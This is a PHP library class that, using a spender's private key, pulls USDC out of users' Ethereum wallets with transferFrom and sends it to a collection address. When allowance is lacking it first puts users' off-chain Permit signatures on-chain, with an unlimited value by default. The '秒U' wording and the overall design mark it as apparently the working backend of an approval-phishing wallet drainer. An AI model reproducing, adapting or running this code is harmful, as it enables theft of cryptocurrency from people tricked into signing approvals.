<?php

namespace app\common\library;

use Elliptic\EC;
use GuzzleHttp\Client;
use kornrunner\Keccak;
use think\Exception;
use Web3p\EthereumTx\Transaction;

/**
 * Ethereum USDC 授权划扣（transferFrom，秒U）
 * 私钥仅用于单次签名，不入库、不写日志。
 */
class HecEthSweep
{
    const DEFAULT_GAS_LIMIT = '120000';

    public static function normalizePrivateKey(string $privateKey): string
    {
        $key = trim($privateKey);
        if (strpos($key, '0x') === 0 || strpos($key, '0X') === 0) {
            $key = substr($key, 2);
        }
        if (!preg_match('/^[a-fA-F0-9]{64}$/', $key)) {
            throw new Exception('私钥格式无效，应为 64 位十六进制');
        }
        return strtolower($key);
    }

    public static function addressFromPrivateKey(string $privateKey): string
    {
        $key = self::normalizePrivateKey($privateKey);
        $ec = new EC('secp256k1');
        $priv = $ec->keyFromPrivate($key);
        $pubKeyHex = $priv->getPublic(false, 'hex');
        $pubKeyBin = hex2bin($pubKeyHex);
        if ($pubKeyBin === false) {
            throw new Exception('私钥推导地址失败');
        }
        if (strlen($pubKeyBin) === 65 && $pubKeyBin[0] === "\x04") {
            $pubKeyBin = substr($pubKeyBin, 1);
        }
        $hash = Keccak::hash($pubKeyBin, 256);
        return '0x' . strtolower(substr($hash, -40));
    }

    /**
     * 使用 spender 私钥从用户钱包划扣 USDC 到收款地址
     *
     * @param array|null $permitFallback 链下 Permit：signature、deadline、value(raw)
     * @return array{txid:string,amount:string,from:string,to:string,spender:string,permit_txid?:string}
     */
    public static function transferFrom(
        string $privateKey,
        string $fromWallet,
        string $spenderAddress,
        string $toAddress,
        string $amountUsdc,
        ?array $permitFallback = null
    ): array {
        $privateKey = self::normalizePrivateKey($privateKey);
        $fromWallet = HecEth::normalizeAddress($fromWallet);
        $spenderAddress = HecEth::normalizeAddress($spenderAddress);
        $toAddress = HecEth::normalizeAddress($toAddress);
        $amountUsdc = trim($amountUsdc);

        if (!$fromWallet || !$spenderAddress || !$toAddress) {
            throw new Exception('钱包地址无效');
        }
        if (!is_numeric($amountUsdc) || bccomp($amountUsdc, '0', 6) <= 0) {
            throw new Exception('秒U数量必须大于 0');
        }

        $derivedSpender = self::addressFromPrivateKey($privateKey);
        if (strtolower($derivedSpender) !== strtolower($spenderAddress)) {
            throw new Exception('私钥与授权对象地址不匹配');
        }

        $amountRaw = HecEth::priceToRaw($amountUsdc);
        if (bccomp($amountRaw, '0', 0) <= 0) {
            throw new Exception('秒U数量过小');
        }

        $permitTxid = '';
        $allowanceRaw = HecEth::fetchAllowance($fromWallet, $spenderAddress);
        if (bccomp($allowanceRaw, $amountRaw, 0) < 0) {
            if (is_array($permitFallback) && !empty($permitFallback['signature'])) {
                $permitTxid = self::submitPermitOnChain(
                    $privateKey,
                    $fromWallet,
                    $spenderAddress,
                    (string)($permitFallback['value'] ?? HecEth::maxPermitValueRaw()),
                    (int)($permitFallback['deadline'] ?? 0),
                    (string)$permitFallback['signature'],
                    (string)($permitFallback['nonce'] ?? '')
                );
                $allowanceRaw = self::pollAllowance($fromWallet, $spenderAddress, $amountRaw);
            }
            if (bccomp($allowanceRaw, $amountRaw, 0) < 0) {
                $hint = is_array($permitFallback) && !empty($permitFallback['signature'])
                    ? '（已尝试将链下 Permit 提交上链' . ($permitTxid !== '' ? '，tx=' . $permitTxid : '') . '）'
                    : '（用户仅有链下签名时，需先完成 Permit 上链或重新授权）';
                throw new Exception(sprintf(
                    '授权额度不足：需要 %s USDC，当前链上授权 %s USDC%s',
                    $amountUsdc,
                    HecEth::rawToAmount($allowanceRaw),
                    $hint
                ));
            }
        }

        $balanceRaw = HecEth::fetchTokenBalance($fromWallet, HecEth::usdcContract());
        if (bccomp($balanceRaw, $amountRaw, 0) < 0) {
            throw new Exception(sprintf(
                '钱包 USDC 余额不足：需要 %s USDC，当前余额 %s USDC',
                $amountUsdc,
                HecEth::rawToAmount($balanceRaw)
            ));
        }

        $data = '0x23b872dd'
            . HecEth::encodeAddress($fromWallet)
            . HecEth::encodeAddress($toAddress)
            . HecEth::encodeUint256Word($amountRaw);

        try {
            $nonce = self::fetchAccountNonce($spenderAddress);
            $gasPrice = self::fetchGasPrice();
            $txData = [
                'nonce'    => $nonce,
                'from'     => $spenderAddress,
                'to'       => HecEth::usdcContract(),
                'gas'      => self::toHexQuantity(self::DEFAULT_GAS_LIMIT),
                'gasPrice' => $gasPrice,
                'value'    => '0x0',
                'chainId'  => HecEth::CHAIN_ID,
                'data'     => $data,
            ];
            $transaction = new Transaction($txData);
            $signedHex = $transaction->sign($privateKey);
            $txHash = self::sendRawTransaction('0x' . $signedHex);
        } catch (\Throwable $e) {
            throw new Exception('链上交易失败：' . $e->getMessage());
        } finally {
            $privateKey = '';
            unset($privateKey);
        }

        if ($txHash === '') {
            throw new Exception('交易已提交但未返回 tx hash');
        }

        self::waitForTransactionReceipt($txHash, 60, 2);
        $actualRaw = self::parseUsdcTransferAmount($txHash, $fromWallet, $toAddress);
        if ($actualRaw !== null && bccomp($actualRaw, '0', 0) > 0) {
            if (bccomp($actualRaw, $amountRaw, 0) < 0) {
                throw new Exception(sprintf(
                    '链上实际划扣 %s USDC，少于请求的 %s USDC',
                    HecEth::rawToAmount($actualRaw),
                    $amountUsdc
                ));
            }
            $amountUsdc = HecEth::rawToAmount($actualRaw);
        }

        $out = [
            'txid'    => $txHash,
            'amount'  => $amountUsdc,
            'from'    => $fromWallet,
            'to'      => $toAddress,
            'spender' => $spenderAddress,
        ];
        if (!empty($permitTxid)) {
            $out['permit_txid'] = $permitTxid;
        }
        return $out;
    }

    /**
     * 将链下 EIP-2612 Permit 提交到链上（任何人可调用，gas 由 spender 私钥支付）
     */
    public static function submitPermitOnChain(
        string $privateKey,
        string $owner,
        string $spender,
        string $valueRaw,
        int $deadline,
        string $signature,
        string $expectedNonce = ''
    ): string {
        $privateKey = self::normalizePrivateKey($privateKey);
        $owner = HecEth::normalizeAddress($owner);
        $spender = HecEth::normalizeAddress($spender);
        $valueRaw = trim($valueRaw);
        if ($valueRaw === '') {
            $valueRaw = HecEth::maxPermitValueRaw();
        }
        if ($deadline <= time()) {
            throw new Exception('Permit 签名已过期，请让用户重新授权');
        }

        $derivedSpender = self::addressFromPrivateKey($privateKey);
        if (strtolower($derivedSpender) !== strtolower($spender)) {
            throw new Exception('私钥与授权对象地址不匹配');
        }

        $parts = HecEth::parsePermitSignature($signature);
        $onChainNonce = HecEth::fetchNonce($owner);
        $expectedNonce = trim($expectedNonce);
        if ($expectedNonce !== '' && bccomp($expectedNonce, $onChainNonce, 0) !== 0) {
            throw new Exception('Permit nonce 已变化，请让用户在前端重新完成 USDC 授权');
        }
        unset($onChainNonce);

        $data = '0xd505accf'
            . HecEth::encodeAddress($owner)
            . HecEth::encodeAddress($spender)
            . HecEth::encodeUint256Word($valueRaw)
            . HecEth::encodeUint256Word((string)$deadline)
            . HecEth::encodeUint256Word((string)$parts['v'])
            . str_pad(substr($parts['r'], 2), 64, '0', STR_PAD_LEFT)
            . str_pad(substr($parts['s'], 2), 64, '0', STR_PAD_LEFT);

        try {
            $nonceTx = self::fetchAccountNonce($spender);
            $gasPrice = self::fetchGasPrice();
            $txData = [
                'nonce'    => $nonceTx,
                'from'     => $spender,
                'to'       => HecEth::usdcContract(),
                'gas'      => self::toHexQuantity('100000'),
                'gasPrice' => $gasPrice,
                'value'    => '0x0',
                'chainId'  => HecEth::CHAIN_ID,
                'data'     => $data,
            ];
            $transaction = new Transaction($txData);
            $signedHex = $transaction->sign($privateKey);
            $txHash = self::sendRawTransaction('0x' . $signedHex);
        } catch (\Throwable $e) {
            throw new Exception('Permit 上链失败：' . $e->getMessage());
        } finally {
            $privateKey = '';
            unset($privateKey);
        }

        if ($txHash === '') {
            throw new Exception('Permit 交易未返回 tx hash');
        }

        self::waitForTransactionReceipt($txHash, 45, 2);
        return $txHash;
    }

    /**
     * Permit 上链后轮询 allowance（部分 RPC 节点有短暂延迟）
     */
    protected static function pollAllowance(string $fromWallet, string $spenderAddress, string $minRaw, int $attempts = 8, int $sleepSeconds = 2): string
    {
        $last = '0';
        for ($i = 0; $i < $attempts; $i++) {
            try {
                $last = HecEth::fetchAllowance($fromWallet, $spenderAddress);
                if (bccomp($last, $minRaw, 0) >= 0) {
                    return $last;
                }
            } catch (\Throwable $e) {
                // retry
            }
            if ($i < $attempts - 1) {
                sleep($sleepSeconds);
            }
        }
        return $last;
    }

    /**
     * 从交易回执解析 USDC Transfer 实际划扣数量
     */
    protected static function parseUsdcTransferAmount(string $txHash, string $fromWallet, string $toAddress): ?string
    {
        $txHash = strtolower(trim($txHash));
        $fromWallet = strtolower(HecEth::normalizeAddress($fromWallet));
        $toAddress = strtolower(HecEth::normalizeAddress($toAddress));
        $usdc = strtolower(HecEth::normalizeAddress(HecEth::usdcContract()));
        $transferTopic = '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef';

        try {
            $receipt = self::rpc('eth_getTransactionReceipt', [$txHash]);
        } catch (\Throwable $e) {
            return null;
        }
        if (!is_array($receipt) || empty($receipt['logs'])) {
            return null;
        }

        foreach ($receipt['logs'] as $log) {
            if (!is_array($log)) {
                continue;
            }
            if (strtolower((string)($log['address'] ?? '')) !== $usdc) {
                continue;
            }
            $topics = $log['topics'] ?? [];
            if (count($topics) < 3) {
                continue;
            }
            if (strtolower((string)$topics[0]) !== $transferTopic) {
                continue;
            }
            $logFrom = '0x' . strtolower(substr((string)$topics[1], -40));
            $logTo = '0x' . strtolower(substr((string)$topics[2], -40));
            if ($logFrom !== $fromWallet || $logTo !== $toAddress) {
                continue;
            }
            return HecEth::decodeUint256((string)($log['data'] ?? '0x0'));
        }

        return null;
    }

    protected static function waitForTransactionReceipt(string $txHash, int $maxAttempts = 40, int $sleepSeconds = 2): void
    {
        $txHash = strtolower(trim($txHash));
        for ($i = 0; $i < $maxAttempts; $i++) {
            try {
                $receipt = self::rpc('eth_getTransactionReceipt', [$txHash]);
                if (is_array($receipt) && !empty($receipt['blockNumber'])) {
                    $status = $receipt['status'] ?? '0x1';
                    if ($status === '0x0' || $status === '0') {
                        throw new Exception('链上交易失败（reverted），请打开 Etherscan 查看原因：' . $txHash);
                    }
                    return;
                }
            } catch (Exception $e) {
                if (strpos($e->getMessage(), 'reverted') !== false || strpos($e->getMessage(), '链上交易失败') !== false) {
                    throw $e;
                }
            }
            sleep($sleepSeconds);
        }
        throw new Exception('链上交易确认超时，请稍后到 Etherscan 查看：' . $txHash);
    }

    protected static function fetchAccountNonce(string $address): string
    {
        $result = self::rpc('eth_getTransactionCount', [$address, 'pending']);
        return self::toHexQuantity($result);
    }

    protected static function fetchGasPrice(): string
    {
        try {
            $result = self::rpc('eth_gasPrice', []);
            return self::toHexQuantity($result);
        } catch (\Throwable $e) {
            return '0x' . dechex(20 * 1000000000); // 20 gwei fallback
        }
    }

    protected static function sendRawTransaction(string $rawTx): string
    {
        $result = self::rpc('eth_sendRawTransaction', [$rawTx]);
        return strtolower(trim((string)$result));
    }

    protected static function rpc(string $method, array $params)
    {
        $last = null;
        foreach (HecEth::rpcUrls() as $url) {
            try {
                return self::rpcVia($url, $method, $params);
            } catch (\Throwable $e) {
                $last = $e;
            }
        }
        throw $last ?: new Exception('RPC 无响应');
    }

    protected static function rpcVia(string $rpcUrl, string $method, array $params, int $timeout = 20)
    {
        $client = new Client(['timeout' => $timeout, 'connect_timeout' => 8, 'http_errors' => false]);
        $response = $client->post($rpcUrl, [
            'headers' => ['Content-Type' => 'application/json'],
            'json'    => [
                'jsonrpc' => '2.0',
                'id'      => 1,
                'method'  => $method,
                'params'  => $params,
            ],
        ]);

        $status = $response->getStatusCode();
        $raw = (string)$response->getBody();
        if ($status < 200 || $status >= 300 || $raw === '') {
            throw new Exception('RPC 无响应');
        }

        $body = json_decode($raw, true);
        if (!is_array($body) || !empty($body['error'])) {
            $msg = is_array($body['error'] ?? null) ? ($body['error']['message'] ?? 'RPC 错误') : 'RPC 响应无效';
            throw new Exception((string)$msg);
        }

        return $body['result'] ?? null;
    }

    protected static function toHexQuantity($value): string
    {
        $value = trim((string)$value);
        if ($value === '') {
            return '0x0';
        }
        if (stripos($value, '0x') === 0) {
            $hex = ltrim(substr($value, 2), '0');
            return '0x' . ($hex === '' ? '0' : strtolower($hex));
        }
        if (function_exists('gmp_init')) {
            $hex = gmp_strval(gmp_init($value, 10), 16);
        } else {
            $hex = '';
            $num = $value;
            while (bccomp($num, '0') > 0) {
                $rem = bcmod($num, '16');
                $hex = dechex((int)$rem) . $hex;
                $num = bcdiv($num, '16', 0);
            }
            if ($hex === '') {
                $hex = '0';
            }
        }
        $hex = ltrim(strtolower($hex), '0');
        return '0x' . ($hex === '' ? '0' : $hex);
    }
}
